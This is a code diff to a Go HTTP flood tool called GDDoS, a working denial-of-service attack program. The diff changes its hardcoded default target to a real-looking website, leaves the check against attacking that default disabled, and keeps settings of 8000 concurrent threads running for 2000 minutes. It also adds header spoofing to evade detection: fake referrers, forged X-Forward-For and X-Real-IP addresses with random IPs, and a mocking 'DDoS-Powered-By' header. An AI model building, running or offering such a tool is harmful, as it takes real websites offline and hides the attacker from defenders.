@@ -10,8 +10,6 @@ import (
 	"net/http"
 	"strings"
 	"time"
-
-	"github.com/gookit/color"
 )
 
 var (
@@ -21,13 +19,13 @@ var (
 	ConcurrencyCount    int
 	DurationMinute      int
 
-	//TODO：Http Proxy
+	//TODO：Proxy
 	DDosHttpClient = &http.Client{
 		Transport: &http.Transport{
 			DialContext: func(ctx context.Context, network, addr string) (conn net.Conn, e error) {
 				dialer := net.Dialer{
-					Timeout:   10 * time.Second,
-					KeepAlive: 60 * time.Second,
+					Timeout:   10 * time.Second, // 超时时间
+					KeepAlive: 60 * time.Second, // KeepAlive时间
 				}
 				return dialer.Dial(network, addr)
 			},
@@ -44,21 +42,41 @@ var (
 		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon 2.0)",
 		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
 	}
+
+	Refs = []string{
+		"https://www.google.com/search?q=",
+		"https://check-host.net/",
+		"https://www.facebook.com/",
+		"https://www.youtube.com/",
+		"https://www.ip138.com/",
+		"https://www.bing.com/search?q=",
+		"https://r.search.yahoo.com/",
+		"https://www.china.gov/index.html",
+		"https://vk.com/profile.php?redirect=",
+		"https://blog.csdn.net/",
+		"https://help.baidu.com/searchResult?keywords=",
+		"https://steamcommunity.com/market/search?q=",
+		"https://baike.sogou.com/v7752987.htm",
+		"https://www.baidu.com/s?wd=%E4%B8%AD%E7%82%B9%E5%9B%9B%E8%BE%B9%E5%BD%A2",
+		"https://www.midishow.com/",
+		// 最后，别忘加上自己
+		"https://github.com/xiaozhu2007/GDDoS",
+	}
 )
 
 // 主程序
 func main() {
-	defaultTargetUrl := "https://xljtj.com" // 对不住了，您
+	defaultTargetUrl := "https://rsm.cool" // 对不住了，您
 
-	flag.StringVar(&Method, "m", "GET", "DDos攻击目标URL请求方式(GET/POST/...)")
-	flag.StringVar(&TargetUrl, "u", defaultTargetUrl, "DDos攻击的目标URL")
-	flag.IntVar(&ConcurrencyCount, "cc", 8000, "并发用户数量")
-	flag.IntVar(&IntervalMillisecond, "ims", 100, "每个用户执行DDos攻击的频率（毫秒）")
-	flag.IntVar(&DurationMinute, "dm", 2000, "DDos攻击持续时间（分钟）")
+	flag.StringVar(&Method, "m", "GET", "DDoS攻击目标URL请求方式(GET/POST/HEAD/...)")
+	flag.StringVar(&TargetUrl, "u", defaultTargetUrl, "DDoS攻击的目标URL")
+	flag.IntVar(&ConcurrencyCount, "cc", 8000, "并发线程数量")
+	flag.IntVar(&IntervalMillisecond, "ims", 100, "每个线程执行DDoS攻击的频率(ms)")
+	flag.IntVar(&DurationMinute, "dm", 2000, "DDos攻击持续时间(分钟)")
 	flag.Parse()
 
 	/*if TargetUrl == defaultTargetUrl {
-		color.Printf("TargetUrl is %s, 请尝试通过命令行传参数重新启动(TargetUrl 不能等于 defaultTargetUrl)。Usage：<red>./goddos -h</>\n", TargetUrl)
+		fmt.Printf("TargetUrl is %s, 请尝试通过命令行重传参数启动(TargetUrl 不能等于 defaultTargetUrl). Usage：./GDDoS -h\n", TargetUrl)
 		return
 	}
 	*/
@@ -75,13 +93,13 @@ func main() {
 func DoAttacking(grindex int) {
 	for i := 0; ; i++ {
 		if result, err := DoHttpRequest(); err != nil {
-			color.Printf("[GDDoS#%d/%d]<red>(%s)</>\n", grindex, i, err.Error())
+			fmt.Printf("[Error#%d/%d]\033[1;31;40m (%s) \033[0m \n", grindex, i, err.Error()) // 红色 客户端错误
 		} else {
-			responseStatus := fmt.Sprintf("<green>(%s)</>", *result)
-			if !strings.Contains(*result, "200 OK") {
-				responseStatus = fmt.Sprintf("<red>(%s)</>", *result)
+			responseStatus := fmt.Sprintf("\033[1;32;40m (%s)", *result) // 绿色 服务端状态码200
+			if !strings.Contains(*result, "200") {
+				responseStatus = fmt.Sprintf("\033[7;33;40m (%s)", *result) // 黄色 服务端状态码400/402/403/404/500/501/502/...
 			}
-			color.Printf("[GDDoS#%d/%d]%s\n", grindex, i, responseStatus)
+			fmt.Printf("[GDDoS#%d/%d]%s \033[0m \n", grindex, i, responseStatus) // 默认
 		}
 		time.Sleep(time.Duration(IntervalMillisecond) * time.Millisecond)
 	}
@@ -93,8 +111,15 @@ func DoHttpRequest() (*string, error) {
 	if err != nil {
 		return nil, err
 	}
-	request.Header.Set("User-Agent", UserAgents[rand.Intn(len(UserAgents))])
-	request.Header.Set("By", "GDDoS")
+	// 让自己看起来不像个机器人
+	request.Header.Set("User-Agent", UserAgents[rand.Intn(len(UserAgents))])                    // 生成伪UA
+	request.Header.Set("Referrer", Refs[rand.Intn(len(Refs))])                                  // 生成伪来源页面的地址
+	request.Header.Set("Accept", "*/*")                                                         // 接受所有
+	request.Header.Set("Accept-encoding", "gzip, deflate, br")                                  // 声明浏览器支持的编码类型
+	request.Header.Set("Accept-language", "zh-CN,zh;q=0.9")                                     // 接受网页语言
+	request.Header.Set("X-Forward-For", "186.240.156.78,128.243.78.96,1.18.56.78,"+genIpaddr()) // 多 层 代 理
+	request.Header.Set("X-Real-IP", "186.240.156.78")                                           // 多 层 代 理
+	request.Header.Set("DDoS-Powered-By", "GDDoS")                                              // 低 调 的 调 戏
 
 	response, err := DDosHttpClient.Do(request)
 	if err != nil {
@@ -105,6 +130,13 @@ func DoHttpRequest() (*string, error) {
 	_, _ = ioutil.ReadAll(response.Body)
 
 	return &response.Status, err
+}
+
+// 该方法用于生成随机IP
+func genIpaddr() string {
+	rand.Seed(time.Now().Unix())
+	ip := fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
+	return ip
 }
 
 // TODO: Add Log
